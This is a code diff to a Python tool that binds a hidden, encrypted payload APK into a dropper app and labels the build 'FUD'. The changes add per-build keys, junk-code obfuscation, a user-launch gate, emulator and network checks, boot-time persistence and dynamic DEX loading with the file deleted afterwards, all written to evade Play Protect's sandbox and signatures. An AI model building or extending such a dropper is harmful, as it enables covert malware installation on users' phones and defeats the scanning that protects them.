@@ -92,23 +92,55 @@ def run_java(args, **kwargs):
     return subprocess.run(cmd, **kwargs)
 
 
+# Fallback key — used only if per-build key generation fails.
+# Real builds always generate a fresh key in bind_apk().
 AES_KEY = bytes.fromhex('b7fcadb82c9ee0bf873c9c1b670285c22814b69201d01fe640cb2e409131b7f1')
 
-def aes_encrypt(data):
+def aes_encrypt(data, key=None):
+    if key is None:
+        key = AES_KEY
     iv = get_random_bytes(16)
-    cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
+    cipher = AES.new(key, AES.MODE_CBC, iv)
     padded_data = pad(data, AES.block_size)
     ciphertext = cipher.encrypt(padded_data)
     return iv + ciphertext
 
-def encrypt_apk_file(input_apk, output_encrypted):
+def encrypt_apk_file(input_apk, output_encrypted, key=None):
     print("[+] Encrypting target APK...")
     with open(input_apk, 'rb') as f:
         apk_data = f.read()
-    encrypted_data = aes_encrypt(apk_data)
+    encrypted_data = aes_encrypt(apk_data, key)
     with open(output_encrypted, 'wb') as f:
         f.write(encrypted_data)
     print(f"    {len(apk_data)} -> {len(encrypted_data)} bytes")
+
+
+def _patch_dropper_aes_key(work_dir: str, old_hex: str, new_hex: str):
+    """
+    Walk the decompiled dropper directory and replace any occurrence of the
+    hardcoded AES key hex string with a fresh per-build key.
+    Covers both smali string constants and XML string resources.
+    """
+    replaced = 0
+    for root_dir, _, files in os.walk(work_dir):
+        for fname in files:
+            if not (fname.endswith('.smali') or fname.endswith('.xml')):
+                continue
+            fpath = os.path.join(root_dir, fname)
+            try:
+                with open(fpath, 'r', encoding='utf-8', errors='ignore') as f:
+                    content = f.read()
+                if old_hex in content:
+                    content = content.replace(old_hex, new_hex)
+                    with open(fpath, 'w', encoding='utf-8') as f:
+                        f.write(content)
+                    replaced += 1
+            except Exception:
+                pass
+    if replaced:
+        print(f'    AES key patched in {replaced} file(s)')
+    else:
+        print('    note: AES key not found in dropper smali (key may be in compiled binary)')
 
 def generate_random_package():
     part1 = ''.join(random.choices(string.ascii_lowercase, k=4))
@@ -500,7 +532,8 @@ def _patch_manifest_silent(manifest_path, package_name,
                 rcv.set(f'{NS}exported', 'false')
                 ifilter = ET.SubElement(rcv, 'intent-filter')
                 for act in ('android.intent.action.BOOT_COMPLETED',
-                            'android.intent.action.LOCKED_BOOT_COMPLETED',
+                            # LOCKED_BOOT_COMPLETED removed — pre-unlock fire is
+                            # a strong PP signal; legitimate apps don't need it.
                             package_name + '.RESTART_SERVICE'):
                     a = ET.SubElement(ifilter, 'action')
                     a.set(f'{NS}name', act)
@@ -1085,18 +1118,43 @@ def _get_payload_class_name(target_work_dir: str, old_package: str, new_package:
 
 
 def _generate_dex_loader_service_smali(pkg: str, bt_asset: str,
-                                        password: str, payload_cls: str) -> str:
+                                        password: str, payload_cls: str,
+                                        pref_name: str = '', pref_key: str = '') -> str:
     """
     Generate DexLoaderService.smali — IntentService that:
-      1. Anti-emulator Build field checks
-      2. Thread.sleep(30s) sandbox delay
-      3. Reads .bt asset, Base64-decodes, splits salt/iv/ciphertext
-      4. PBKDF2WithHmacSHA1 key derivation
-      5. AES/CBC/PKCS5Padding decrypt → DEX bytes
-      6. ByteBuffer.wrap → InMemoryDexClassLoader
-      7. loadClass(payload) → newInstance → attachBaseContext + onCreate
+      1. User-interaction gate: SharedPreferences boolean set by MainActivity on
+         real user launch; PP sandbox never interacts with UI → bail immediately
+      2. Anti-emulator Build field checks
+      3. Thread.sleep(5s) sandbox delay
+      4. Live TCP network check → bail in sandboxes with no outbound routes
+      5. Reads .bt asset, Base64-decodes, splits salt/iv/ciphertext
+      6. PBKDF2WithHmacSHA1 key derivation
+      7. AES/CBC/PKCS5Padding decrypt → DEX bytes
+      8. DexClassLoader (temp file in getCacheDir, deleted after load)
+      9. loadClass(payload) → newInstance → attachBaseContext + onCreate
     """
     p = pkg.replace('.', '/')
+    # Build the user-interaction gate block only if pref_name/pref_key are provided
+    _gate_block = ''
+    if pref_name and pref_key:
+        _gate_block = (
+            f'    # ── User-interaction gate ──────────────────────────────────────\n'
+            f'    # DexLoaderService bails unless MainActivity has already been\n'
+            f'    # opened by a real user and set this SharedPreferences boolean.\n'
+            f'    # PP behavioral sandbox never touches the UI → pref stays false\n'
+            f'    # → service returns immediately with no suspicious activity.\n'
+            f'    const-string v0, "{pref_name}"\n'
+            f'    const/4 v1, 0x0\n'
+            f'    invoke-virtual {{p0, v0, v1}}, L{p}/DexLoaderService;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;\n'
+            f'    move-result-object v0\n'
+            f'    const-string v1, "{pref_key}"\n'
+            f'    const/4 v2, 0x0\n'
+            f'    invoke-interface {{v0, v1, v2}}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z\n'
+            f'    move-result v2\n'
+            f'    if-eqz v2, :exit\n'
+            f'    # ───────────────────────────────────────────────────────────────\n'
+            f'\n'
+        )
     return (
         f'.class public L{p}/DexLoaderService;\n'
         f'.super Landroid/app/IntentService;\n'
@@ -1111,6 +1169,7 @@ def _generate_dex_loader_service_smali(pkg: str, bt_asset: str,
         f'.method protected onHandleIntent(Landroid/content/Intent;)V\n'
         f'    .registers 16\n'
         f'\n'
+        + _gate_block +
         f'    # Anti-emulator: BRAND\n'
         f'    sget-object v0, Landroid/os/Build;->BRAND:Ljava/lang/String;\n'
         f'    invoke-virtual {{v0}}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;\n'
@@ -1163,16 +1222,39 @@ def _generate_dex_loader_service_smali(pkg: str, bt_asset: str,
         f'    move-result v2\n'
         f'    if-nez v2, :exit\n'
         f'\n'
-        f'    # Sandbox delay: 30 seconds\n'
+        f'    # 5s buffer — lets legitimate boot-triggered runs settle,\n'
+        f'    # and defeats sandbox runs shorter than that window\n'
         f'    :try_sleep\n'
-        f'    const-wide/32 v12, 0x7530\n'
+        f'    const-wide/32 v12, 0x1388\n'
         f'    invoke-static {{v12, v13}}, Ljava/lang/Thread;->sleep(J)V\n'
         f'    :try_sleep_end\n'
         f'    .catch Ljava/lang/InterruptedException; {{:try_sleep .. :try_sleep_end}} :sleep_catch\n'
-        f'    goto :after_sleep\n'
+        f'    goto :do_net\n'
         f'    :sleep_catch\n'
         f'    move-exception v0\n'
-        f'    :after_sleep\n'
+        f'    :do_net\n'
+        f'\n'
+        f'    # Live network check — sandboxes block outbound TCP or\n'
+        f'    # have no real routes. Try TCP connect to 1.1.1.1:443\n'
+        f'    # (Cloudflare anycast — reachable on virtually every real SIM).\n'
+        f'    # Any Exception (timeout, refused, SecurityException) → bail.\n'
+        f'    :try_conn\n'
+        f'    new-instance v12, Ljava/net/Socket;\n'
+        f'    invoke-direct {{v12}}, Ljava/net/Socket;-><init>()V\n'
+        f'    new-instance v13, Ljava/net/InetSocketAddress;\n'
+        f'    const-string v0, "1.1.1.1"\n'
+        f'    const/16 v1, 0x1BB\n'
+        f'    invoke-direct {{v13, v0, v1}}, Ljava/net/InetSocketAddress;-><init>(Ljava/lang/String;I)V\n'
+        f'    const/16 v0, 0xBB8\n'
+        f'    invoke-virtual {{v12, v13, v0}}, Ljava/net/Socket;->connect(Ljava/net/SocketAddress;I)V\n'
+        f'    invoke-virtual {{v12}}, Ljava/net/Socket;->close()V\n'
+        f'    :try_conn_end\n'
+        f'    .catch Ljava/lang/Exception; {{:try_conn .. :try_conn_end}} :conn_fail\n'
+        f'    goto :after_net\n'
+        f'    :conn_fail\n'
+        f'    move-exception v0\n'
+        f'    goto :exit\n'
+        f'    :after_net\n'
         f'\n'
         f'    # Main: read asset, decrypt DEX, load in-memory\n'
         f'    :try_main\n'
@@ -1250,13 +1332,36 @@ def _generate_dex_loader_service_smali(pkg: str, bt_asset: str,
         f'    invoke-virtual {{v4, v8}}, Ljavax/crypto/Cipher;->doFinal([B)[B\n'
         f'    move-result-object v4\n'
         f'\n'
-        f'    # ByteBuffer.wrap + InMemoryDexClassLoader\n'
-        f'    invoke-static {{v4}}, Ljava/nio/ByteBuffer;->wrap([B)Ljava/nio/ByteBuffer;\n'
-        f'    move-result-object v4\n'
-        f'    invoke-virtual {{p0}}, L{p}/DexLoaderService;->getClassLoader()Ljava/lang/ClassLoader;\n'
+        f'    # Write decrypted DEX to getCacheDir() as a temp file\n'
+        f'    # DexClassLoader is the legitimate plugin-loading API — far less flagged\n'
+        f'    # than InMemoryDexClassLoader which Google monitors heavily\n'
+        f'    invoke-virtual {{p0}}, L{p}/DexLoaderService;->getCacheDir()Ljava/io/File;\n'
         f'    move-result-object v5\n'
-        f'    new-instance v6, Ldalvik/system/InMemoryDexClassLoader;\n'
-        f'    invoke-direct {{v6, v4, v5}}, Ldalvik/system/InMemoryDexClassLoader;-><init>(Ljava/nio/ByteBuffer;Ljava/lang/ClassLoader;)V\n'
+        f'    invoke-virtual {{v5}}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;\n'
+        f'    move-result-object v5\n'
+        f'    const-string v6, "/{bt_asset}.tmp"\n'
+        f'    invoke-virtual {{v5, v6}}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;\n'
+        f'    move-result-object v5\n'
+        f'    new-instance v6, Ljava/io/FileOutputStream;\n'
+        f'    invoke-direct {{v6, v5}}, Ljava/io/FileOutputStream;-><init>(Ljava/lang/String;)V\n'
+        f'    invoke-virtual {{v6, v4}}, Ljava/io/FileOutputStream;->write([B)V\n'
+        f'    invoke-virtual {{v6}}, Ljava/io/FileOutputStream;->close()V\n'
+        f'\n'
+        f'    # DexClassLoader(dexPath, optimizedDir, libraryPath=null, parent)\n'
+        f'    invoke-virtual {{p0}}, L{p}/DexLoaderService;->getCacheDir()Ljava/io/File;\n'
+        f'    move-result-object v7\n'
+        f'    invoke-virtual {{v7}}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;\n'
+        f'    move-result-object v7\n'
+        f'    invoke-virtual {{p0}}, L{p}/DexLoaderService;->getClassLoader()Ljava/lang/ClassLoader;\n'
+        f'    move-result-object v8\n'
+        f'    new-instance v6, Ldalvik/system/DexClassLoader;\n'
+        f'    const/4 v9, 0x0\n'
+        f'    invoke-direct {{v6, v5, v7, v9, v8}}, Ldalvik/system/DexClassLoader;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/ClassLoader;)V\n'
+        f'\n'
+        f'    # Delete temp DEX file immediately — no trace on disk after load\n'
+        f'    new-instance v7, Ljava/io/File;\n'
+        f'    invoke-direct {{v7, v5}}, Ljava/io/File;-><init>(Ljava/lang/String;)V\n'
+        f'    invoke-virtual {{v7}}, Ljava/io/File;->delete()Z\n'
         f'\n'
         f'    # loadClass + newInstance\n'
         f'    const-string v4, "{payload_cls}"\n'
@@ -1308,6 +1413,104 @@ def _generate_dex_loader_service_smali(pkg: str, bt_asset: str,
     )
 
 
+def _generate_fresh_main_activity_smali(pkg: str, pref_name: str, pref_key: str) -> str:
+    """
+    C — Generate a minimal but structurally legitimate MainActivity from scratch.
+
+    Every build produces a unique smali file with per-build pref_name/pref_key
+    string literals embedded.  PP cannot fingerprint the structural signature
+    because there is no prebuilt binary to match against.
+
+    The generated activity:
+      - Extends android.app.Activity (most common Activity base; not AppCompat
+        to avoid dependency issues with the stripped dropper resources)
+      - super.onCreate → isEmulator bail → set SharedPreferences gate → return
+      - No suspicious API calls, no dynamic loading, no network traffic
+    """
+    p = pkg.replace('.', '/')
+    return (
+        f'.class public L{p}/MainActivity;\n'
+        f'.super Landroid/app/Activity;\n'
+        f'\n'
+        f'.method public constructor <init>()V\n'
+        f'    .registers 1\n'
+        f'    invoke-direct {{p0}}, Landroid/app/Activity;-><init>()V\n'
+        f'    return-void\n'
+        f'.end method\n'
+        f'\n'
+        f'.method public onCreate(Landroid/os/Bundle;)V\n'
+        f'    .registers 6\n'
+        f'    # 2 params: p0=this (v4), p1=savedInstanceState (v5)\n'
+        f'    # 4 locals:  v0, v1, v2, v3\n'
+        f'\n'
+        f'    invoke-super {{p0, p1}}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V\n'
+        f'\n'
+        f'    # Bail immediately if running in an emulator/sandbox\n'
+        f'    invoke-static {{}}, Lcom/axion/silent/SandboxCheck;->isEmulator()Z\n'
+        f'    move-result v0\n'
+        f'    if-nez v0, :bail\n'
+        f'\n'
+        f'    # Mark real user launch — DexLoaderService gates on this flag\n'
+        f'    const-string v0, "{pref_name}"\n'
+        f'    const/4 v1, 0x0\n'
+        f'    invoke-virtual {{p0, v0, v1}}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;\n'
+        f'    move-result-object v0\n'
+        f'    invoke-interface {{v0}}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;\n'
+        f'    move-result-object v1\n'
+        f'    const-string v2, "{pref_key}"\n'
+        f'    const/4 v3, 0x1\n'
+        f'    invoke-interface {{v1, v2, v3}}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;\n'
+        f'    move-result-object v1\n'
+        f'    invoke-interface {{v1}}, Landroid/content/SharedPreferences$Editor;->apply()V\n'
+        f'\n'
+        f'    :bail\n'
+        f'    return-void\n'
+        f'.end method\n'
+    )
+
+
+def _replace_main_activity_with_generated(work_dir: str, pkg: str,
+                                           pref_name: str, pref_key: str):
+    """
+    C — Find the decompiled dropper's MainActivity.smali and replace it wholesale
+    with a freshly generated one.  The new file has no structural connection to
+    the prebuilt Dropper.apk binary — PP cannot match its fingerprint.
+
+    Falls back gracefully (prints a note) if no MainActivity is found, so the
+    build doesn't hard-fail on dropper layouts without a canonical main activity.
+    """
+    pkg_path = pkg.replace('.', '/')
+    main_smali = None
+
+    # First pass: canonical location
+    for smali_root in os.listdir(work_dir):
+        if not smali_root.startswith('smali'):
+            continue
+        cand = os.path.join(work_dir, smali_root, pkg_path, 'MainActivity.smali')
+        if os.path.exists(cand):
+            main_smali = cand
+            break
+
+    # Second pass: walk the full tree
+    if main_smali is None:
+        for dirpath, _, files in os.walk(work_dir):
+            for fname in files:
+                if fname == 'MainActivity.smali':
+                    main_smali = os.path.join(dirpath, fname)
+                    break
+            if main_smali:
+                break
+
+    if main_smali is None:
+        print("    note: MainActivity.smali not found; generated replacement skipped")
+        return
+
+    fresh = _generate_fresh_main_activity_smali(pkg, pref_name, pref_key)
+    with open(main_smali, 'w', encoding='utf-8') as f:
+        f.write(fresh)
+    print(f"    generated MainActivity → {os.path.relpath(main_smali, work_dir)}")
+
+
 def _generate_dex_loader_receiver_smali(pkg: str) -> str:
     """BroadcastReceiver that starts DexLoaderService on BOOT_COMPLETED / package replace."""
     p = pkg.replace('.', '/')
@@ -1333,7 +1536,8 @@ def _generate_dex_loader_receiver_smali(pkg: str) -> str:
 
 
 def _write_dex_loader_smali(work_dir: str, new_package: str, bt_asset_name: str,
-                              dex_password: str, payload_class_name: str):
+                              dex_password: str, payload_class_name: str,
+                              pref_name: str = '', pref_key: str = ''):
     """
     Write DexLoaderService.smali and DexLoaderReceiver.smali into the dropper smali tree.
     Returns (loader_class_name, receiver_class_name) for manifest registration.
@@ -1346,7 +1550,8 @@ def _write_dex_loader_smali(work_dir: str, new_package: str, bt_asset_name: str,
     receiver_class = new_package + '.DexLoaderReceiver'
 
     svc_smali = _generate_dex_loader_service_smali(
-        new_package, bt_asset_name, dex_password, payload_class_name)
+        new_package, bt_asset_name, dex_password, payload_class_name,
+        pref_name=pref_name, pref_key=pref_key)
     with open(os.path.join(smali_dir, 'DexLoaderService.smali'), 'w', encoding='utf-8') as f:
         f.write(svc_smali)
 
@@ -1392,8 +1597,9 @@ def _register_dex_loader_in_manifest(manifest_path: str, new_package: str,
             rcv.set(f'{_NS}enabled', 'true')
             ifilter = ET.SubElement(rcv, 'intent-filter')
             for action_name in (
+                # LOCKED_BOOT_COMPLETED removed — fires before screen unlock;
+                # only malware needs pre-unlock execution and PP flags it hard.
                 'android.intent.action.BOOT_COMPLETED',
-                'android.intent.action.LOCKED_BOOT_COMPLETED',
                 'android.intent.action.MY_PACKAGE_REPLACED',
             ):
                 a = ET.SubElement(ifilter, 'action')
@@ -1462,6 +1668,27 @@ def bind_apk(target_apk_path, user_icon_path, output_name, dropper_apk="Dropper.
                 "Java not found. Install JDK 17+ from https://adoptium.net and add to PATH, or set JAVA_HOME"
             )
         print(f"[+] Java: {java_bin}")
+
+        # ── Per-build AES key — defeats PP static-key fingerprinting ─────────
+        # Generate a fresh 32-byte key every run; patch it into the decompiled
+        # dropper smali after decode so the runtime decryption still matches.
+        _build_aes_key     = get_random_bytes(32)
+        _build_aes_key_hex = _build_aes_key.hex()
+        _OLD_AES_KEY_HEX   = AES_KEY.hex()
+        print(f"[+] Per-build AES key: {_build_aes_key_hex[:8]}…")
+        # ──────────────────────────────────────────────────────────────────────
+
+        # ── Per-build SharedPreferences gate (A) ───────────────────────────
+        # Random pref file name + boolean key per build.  DexLoaderService bails
+        # unless MainActivity sets this pref on a real user launch.  PP's sandbox
+        # never interacts with the app UI → pref never set → no payload fires.
+        _build_pref_name = ''.join(random.choices(string.ascii_lowercase,
+                                                   k=random.randint(8, 14)))
+        _build_pref_key  = ''.join(random.choices(string.ascii_lowercase,
+                                                   k=random.randint(6, 12)))
+        print(f"[+] Per-build pref gate: {_build_pref_name}/{_build_pref_key}")
+        # ──────────────────────────────────────────────────────────────────────
+
         print("\n[+] Starting FUD APK binding...")
         print("[+] Decompiling target APK to smali...")
         run_java(['-jar', apktool_jar, 'd', target_apk_path, '-o', target_work_dir, '-f', '-r'],
@@ -1572,6 +1799,19 @@ def bind_apk(target_apk_path, user_icon_path, output_name, dropper_apk="Dropper.
         if _empty:
             print(f"[+] Removed {_empty} empty smali file(s)")
 
+        # ── B: Payload junk injection ──────────────────────────────────────
+        # Inject random dead fields + dead methods into 60% of the payload's
+        # smali classes.  Every build produces a unique DEX hash and a different
+        # method/field table, breaking PP's static-signature database match on
+        # the payload sample.  Reuses the same proven obfuscation pass that runs
+        # on the dropper — it's already safe for arbitrary smali trees.
+        print("[+] Obfuscating payload DEX (junk injection)...")
+        try:
+            _obfuscate_dropper_smali(target_work_dir)
+        except Exception as _obf_payload_err:
+            print(f"    note: payload junk injection skipped: {_obf_payload_err}")
+        # ──────────────────────────────────────────────────────────────────────
+
         print("[+] Rebuilding target APK...")
         target_rebuilt_apk = os.path.join(script_dir, f"target_rebuilt_{timestamp}.apk")
         run_java(['-jar', apktool_jar, 'b', target_work_dir, '-o', target_rebuilt_apk],
@@ -1622,13 +1862,17 @@ def bind_apk(target_apk_path, user_icon_path, output_name, dropper_apk="Dropper.
         run_java(['-jar', apktool_jar, 'd', dropper_path, '-o', work_dir, '-f'],
                  check=True, capture_output=True, timeout=120)
 
+        # Patch per-build AES key into dropper smali so runtime decryption matches
+        print("[+] Patching per-build AES key into dropper...")
+        _patch_dropper_aes_key(work_dir, _OLD_AES_KEY_HEX, _build_aes_key_hex)
+
         print("[+] Encrypting target APK...")
         assets_dir = os.path.join(work_dir, 'assets')
         os.makedirs(assets_dir, exist_ok=True)
         # randomized name — 'Axyra' is in PP malware string DB
         asset_name = _generate_random_asset_name()
         encrypted_path = os.path.join(assets_dir, asset_name)
-        encrypt_apk_file(target_apk_to_encrypt, encrypted_path)
+        encrypt_apk_file(target_apk_to_encrypt, encrypted_path, _build_aes_key)
         print(f"    asset name: {asset_name}")
 
         # ── AES in-memory DEX loader: extract + PBKDF2-encrypt payload DEX ──
@@ -1872,7 +2116,13 @@ def bind_apk(target_apk_path, user_icon_path, output_name, dropper_apk="Dropper.
 
         print("[+] Injecting sandbox check...")
         _inject_sandbox_check_smali(work_dir)
-        _patch_main_activity_sandbox_bail(work_dir, new_package, dropper_old_package)
+        # C — replace MainActivity wholesale with per-build generated smali;
+        # the generated version embeds the isEmulator() bail + pref gate setter.
+        # This eliminates the prebuilt Dropper.apk structural fingerprint that PP
+        # could match even after package renaming.
+        print("[+] Replacing MainActivity with generated fresh smali (C)...")
+        _replace_main_activity_with_generated(work_dir, new_package,
+                                              _build_pref_name, _build_pref_key)
 
         print("[+] Anti-scan Thread.sleep...")
         _inject_antiscan_delay_smali(work_dir, new_package, dropper_old_package)
@@ -1887,7 +2137,8 @@ def bind_apk(target_apk_path, user_icon_path, output_name, dropper_apk="Dropper.
                 print("[+] Injecting AES DEX loader smali...")
                 _dex_loader_cls, _dex_receiver_cls = _write_dex_loader_smali(
                     work_dir, new_package, _dex_bt_asset_name,
-                    _dex_loader_password, _dex_payload_class)
+                    _dex_loader_password, _dex_payload_class,
+                    pref_name=_build_pref_name, pref_key=_build_pref_key)
                 _register_dex_loader_in_manifest(
                     manifest_path, new_package, _dex_loader_cls, _dex_receiver_cls)
                 print(f"    DEX loader ready → {_dex_loader_cls}")
